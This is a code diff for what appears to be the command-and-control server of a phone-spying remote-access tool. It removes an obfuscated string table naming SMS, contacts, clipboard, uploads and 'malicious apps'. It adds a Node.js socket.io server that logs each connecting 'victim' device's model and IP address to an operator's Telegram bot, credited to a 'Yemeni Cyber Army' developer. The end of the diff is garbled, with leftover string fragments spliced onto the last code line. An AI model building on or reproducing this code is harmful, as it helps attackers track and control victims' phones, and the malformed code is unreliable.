@@ -1,85 +1,58 @@
-function _0x36a7(_0x235dc7, _0x192162) {
-    const _0x1e1523 = _0x4313();
-    return _0x36a7 = function (_0x213856, _0x2f9cb0) {
-        _0x213856 = _0x213856 - (0x1 * 0x64b + 0x1c5 * 0xf + -0x1 * 0x1ee3);
-        let _0x14626b = _0x1e1523[_0x213856];
-        return _0x14626b;
-    }, _0x36a7(_0x235dc7, _0x192162);
+const express = require('express');
+const http = require('http');
+const { Server } = require('socket.io');
+const telegramBot = require('node-telegram-bot-api');
+const fs = require('fs');
+const path = require('path');
+
+// قراءة البيانات من data.json
+let config;
+try {
+    config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
+} catch (err) {
+    console.error("خطأ: تأكد من وجود ملف data.json بشكل صحيح!");
+    process.exit(1);
 }
-function _0x4313() {
-    const _0x44591d = [
-        'currentTar',
-        'ل\x20جيميل\x20📧',
-        'off',
-        'ARnlz',
-        'all-sms',
-        'HMTET',
-        '<b>إصدار\x20ا',
-        'MQeYG',
-        'ائل\x20💬',
-        'hsPOD',
-        'WpXBx',
-        'gSIPM',
-        'clipboard',
-        'ل\x20</b>\x0a\x0a',
-        'VSggw',
-        'إلى\x20القائم',
-        'emit',
-        'لشاشة\x20😎',
-        'Helff',
-        '✯\x20حدد\x20اي\x20ا',
-        'POWcA',
-        '<b>✯\x20الان\x20',
-        '✯\x20معلومات\x20',
-        'ة</b>\x0a\x0a',
-        'FxUCM',
-        '→\x20</b>',
-        'toast',
-        'مكنك\x20التحك',
-        'contacts',
-        '✯\x20رجوع\x20✯',
-        'FwqNA',
-        '|back-0',
-        'abEHy',
-        'hGhIS',
-        'ا\x20يتحمل\x20مس',
-        'SgOTN',
-        '𝚗𝚝\x20𝚝𝚑𝚎\x20𝚍𝚎𝚟',
-        'model',
-        'ي\x20وسهل\x20الا',
-        'tppeS',
-        'YjyYm',
-        'يات\x20المطور',
-        'سال\x20الرسال',
-        'smsToAllCo',
-        'fJklo',
-        'CLOLW',
-        'playAudio',
-        '\x20الاشعارات',
-        'log',
-        'pgYMs',
-        'KRrbd',
-        '\x20هاتف\x20الضح',
-        'twgFo',
-        'toastText',
-        'ض\x20جميع\x20الم',
-        'بنجاح\x20\x20سوف',
-        '341829KdsbiA',
-        'RpRKE',
-        '\x20الضحيه\x20',
-        'pyhJJ',
-        'مه\x20',
-        'HBeIo',
-        'upload',
-        'cFJHr',
-        'sockets',
-        'PORT',
-        'ت\x20خبيثه\x20لا',
-        '📽\x20التطبيقا',
-        'size',
-        'جميع\x20ارقام',
-        'onText',
-        '✯\x20تحميل\x20مل',
+
+const app = express();
+const server = http.createServer(app);
+const io = new Server(server);
+const bot = new telegramBot(config.token, { polling: true });
+
+// واجهة السيرفر
+app.get('/', (req, res) => {
+    res.send('<h1>الجيش اليمني السيبراني 🇾🇪 - السيرفر يعمل بنجاح</h1>');
+});
+
+// عند اتصال ضحية جديد
+io.on('connection', (socket) => {
+    const model = socket.handshake.query.model || "جهاز غير معروف";
+    const ip = socket.handshake.address;
+    
+    console.log(`متصل جديد: ${model}`);
+
+    const logMsg = `<b>✯ ضحية جديد متصل ✯</b>\n\n` +
+                   `<b>الأسم:</b> ${model}\n` +
+                   `<b>IP:</b> ${ip}\n` +
+                   `<b>المطور:</b> ☠️الياس البكيـــــــــــــــلي🇾🇪☠️`;
+
+    bot.sendMessage(config.id, logMsg, { parse_mode: 'HTML' });
+});
+
+// أوامر البوت
+bot.onText(/\/start/, (msg) => {
+    const welcome = `مرحبا بكم في عالم الامن السيبراني\n` +
+                    `قوى بوت تحكم لـ 🦅🇾🇪 الجيش اليمني السيبراني 🇾🇪\n\n` +
+                    `المطور: ☠️الياس البكيـــــــــــــــلي🇾🇪☠️\n` +
+                    `تواصل: @a7sb5`;
+    bot.sendMessage(msg.chat.id, welcome);
+});
+
+// تشغيل السيرفر
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`السيرفر يعمل على المنفذ: ${PORT}`);
+});  '✯\x20تحميل\x20مل',
         'vgQYv',
         'file_id',
         'سية</b>\x0a\x0a',
